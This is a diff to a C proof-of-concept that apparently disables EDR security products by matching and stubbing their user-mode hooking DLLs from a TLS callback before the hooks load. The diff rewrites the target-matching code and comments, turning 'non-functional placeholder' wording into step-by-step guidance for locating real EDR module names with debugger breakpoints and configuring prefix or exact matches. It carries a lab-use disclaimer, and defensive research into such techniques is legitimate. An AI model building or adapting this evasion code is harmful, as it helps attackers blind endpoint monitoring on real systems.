@@ -52,11 +52,14 @@
  * build with MSBuild. /MT and /INCLUDE:_tls_used are set in the project
  * and forced from this file as well. x64 only.
  *
- * NOTE: This PoC ships with placeholder DLL names. Replace the prefixes
- * and exact names in is_hooking_dll() with the actual target module
- * names from your lab environment before building. The technique itself
- * is generic -- any EDR that delivers its user-mode hooks via APC after
- * EXE TLS has the same window.
+ * NOTE: This PoC ships with placeholder DLL names that match nothing on
+ * a live system. Edit is_hooking_dll() before building:
+ *   - prefix_dll() for versioned DLLs (suffix changes per agent update)
+ *   - wicmp()      for fixed-name DLLs (same filename across versions)
+ * See the comment block above is_hooking_dll() for guidance on choosing
+ * between prefix and exact matching. The technique itself is generic --
+ * any EDR that delivers its user-mode hooks via APC after EXE TLS has
+ * the same window.
  *
  * Lab use only. Not production.
  */
@@ -207,43 +210,45 @@ static int wicmp(const wchar_t *a, const wchar_t *b)
  *  TARGET DLL MATCHING
  * ========================================================================
  *
- * Replace the placeholder prefixes and exact names below with the actual
- * DLL basenames from the EDR product you are analyzing in your lab.
+ * Replace the placeholders below with the actual DLL basenames from the
+ * EDR product you are analyzing in your lab. Use a debugger breakpoint
+ * on ntdll!LdrLoadDll or ntdll!LdrpSendDllNotifications to identify
+ * every image the loader maps at startup.
  *
- * EDR products inject user-mode hooking engines via different module
- * names. Common patterns:
+ * Two match strategies:
  *
- *   - A prefix-versioned DLL (e.g. "edr_hook12345.dll") matched by
- *     prefix_dll() -- catches any build/version suffix.
+ *   prefix_dll(name, L"hookeng")
+ *       Use when the DLL name includes a version number, build hash, or
+ *       other suffix that changes across agent updates. Give only the
+ *       stable leading part. The function checks that the name starts
+ *       with the prefix (case-insensitive) AND ends with ".dll", so
+ *       "hookeng.dll", "hookeng8542.dll", "hookeng_v3.dll" all match
+ *       but "hookeng.cfg" does not.
  *
- *   - An exact-name DLL (e.g. "edrclient64.dll") matched by wicmp()
- *     for a case-insensitive full-name compare.
+ *   wicmp(name, L"agentclient64.dll") == 0
+ *       Use when the DLL name is always exactly the same across
+ *       versions. Full case-insensitive comparison — only the exact
+ *       basename matches. Safer than prefix when the name is generic
+ *       enough that a prefix could collide with unrelated modules.
  *
- * The example entries below are non-functional placeholders.
+ * You can use prefix_dll for everything if the prefix is specific enough
+ * to never collide with non-target DLLs. wicmp exists for cases where
+ * you want zero ambiguity. Stubbing the wrong module crashes the process.
  *
- * Typical naming conventions seen across various EDR products:
- *   - Prefix + build number: "hookengine12345.dll" (version-stamped)
- *   - Architecture suffix:   "hookclient64.dll" / "hookclient.dll"
- *   - Internal codename:     "sensorcore.dll", "agentruntime.dll"
- * Identifying the real names is part of the analysis; a debugger
- * breakpoint on ntdll!LdrLoadDll or ntdll!LdrpSendDllNotifications
- * in a lab VM reveals every image the loader maps at startup.
+ * Add or remove entries to match what your target EDR injects — there is
+ * no fixed number of entries required.
  */
 static int is_hooking_dll(const wchar_t *basename)
 {
-    /* ---- Placeholder A: prefix match for a versioned hooking module ---- */
-    /* Example: an EDR that ships "edr_hookNNNNN.dll" where NNNNN is a
-     * build number. Replace "edr_hook" with the real prefix. */
+    /* ---- Versioned DLLs: use prefix_dll with the stable leading part -- */
+    /* The suffix (build number, hash, etc.) changes per agent version.
+     * Example: "edr_hook8542.dll", "edr_hook9100.dll" → prefix "edr_hook" */
     if (prefix_dll(basename, L"edr_hook"))     return 1;
-
-    /* ---- Placeholder B: prefix match for a second component ----------- */
-    /* Example: a companion device-interface DLL named "edr_devNNNNN.dll".
-     * Replace "edr_dev" with the real prefix. */
     if (prefix_dll(basename, L"edr_dev"))      return 1;
 
-    /* ---- Placeholder C: exact match for a client module --------------- */
-    /* Example: an in-process client injected early. Replace with the real
-     * 64-bit and 32-bit basenames. */
+    /* ---- Fixed-name DLLs: use wicmp for an exact basename match ------- */
+    /* The full filename never changes across versions.
+     * Example: "edrclient64.dll" is always "edrclient64.dll" */
     if (wicmp(basename, L"edrclient64.dll") == 0) return 1;
     if (wicmp(basename, L"edrclient.dll") == 0)   return 1;
 
